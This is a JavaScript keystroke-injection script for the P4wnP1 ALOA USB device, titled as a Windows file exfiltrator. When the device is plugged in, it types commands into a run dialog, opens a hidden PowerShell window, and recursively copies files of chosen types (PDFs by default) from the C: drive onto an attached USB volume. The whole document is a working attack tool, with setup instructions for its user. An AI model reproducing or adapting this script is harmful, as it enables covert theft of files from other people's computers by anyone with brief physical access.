///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// WindowsFileExfiltrator.js
// Original author: Saytonic https://youtu.be/I_BjCdJlCo4
// Edited by: Coderdude112 on GitHub 
// When plugged in, this script will copy all of the files on the computer that match the File_types to the USB_drive
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// PREREQUISTES: (Things that need to happen before you can use this attack)
// Enable the USB and keyboard mode on the P4wnP1 ALOA
// Set the USB_drive varaible to the name of the USB on the P4wnP1 ALOA. By default this is set to 'SNEAKY'
// Set the File_types variable to the types of file you want to exfiltrate. By default this is set to '*.pdf'
// Set the Search_drive variable to the drive you want to exfiltrate files from. Regaurdless of this the default folders (3D Objects, Documents, Videos, Pictures, ect) will still be searched

// Set the keyboard layout and all variables
layout('us');				        // Set keyboard layout to US
typingSpeed(0,0);			      // Sets the typing speed to FAST
var Ready = "False"         // Sets Ready to false beacuse we are not ready to begin the attack
var USB_drive = "SNEAKY"    // Sets the name of the drive, so the program knows where to exfil the items
var File_types = ["*.pdf"]  // The file extensions that will be exfiltrated
var Search_drive = ["C:"] 	// The path to look for files NOTE: this will include ALL folders and sub-folders

function Attack() { // Initalizes the function Attack
  delay(2200);  // Delay to make sure that File Explorer doesent take focus
  press("GUI r"); // Opens a run command
  delay(500);
  type("powershell\n"); // Opens powershell
  delay(500);
  
  type("powershell -windowstyle hidden {"); // Makes the window hidden for the duration of the attack
  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq '" + USB_drive + "' } | select name;");  // Find the USB_drive to save the files
  type("$exfilPath = \"Loot\\File-Exfiltrator\";"); // Save the loot path to exfilPath
  type("$totalPath = $usbPath.name + $exfilPath;"); // Save the total path for the loot including the drive letter to totalPath
  type("mkdir $totalPath;");  // Makes the loot directory
  type("Get-ChildItem C: -Recurse -Include " + File_types + " | ForEach-Object ` {copy $_ -Destination $totalPath};"); // Searches and copies the files in the default folders (3D Objects, Documents, Videos, Pictures, ect)
  type("Get-ChildItem " + Search_drive + "\\ -Recurse -Include " + File_types + " | ForEach-Object ` {copy $_ -Destination $totalPath};");  // Searches and copies the files in the Search_drive

  type("exit;}\n"); // Adds the close curly bracket making the attack hidden and starts the attack 
}

function Initalized() { // Initalizes the function that checks if the device has been initalized by the host before running the attack
  while (Ready = "False") {
    press("SCROLL");
    result = waitLED(SCROLL,10);
    
    if (result.SCROLL) {  // If this is true then the device is initalized. The loop will break and the attack will start
      Ready = "True";
      break;   
    } else {  // The device is not initalized so we will press scroll lock and retry
        press("SCROLL");
      }
    
  }
}

Initalized(); // Check if the host has initalized us
Attack(); // Run the attack
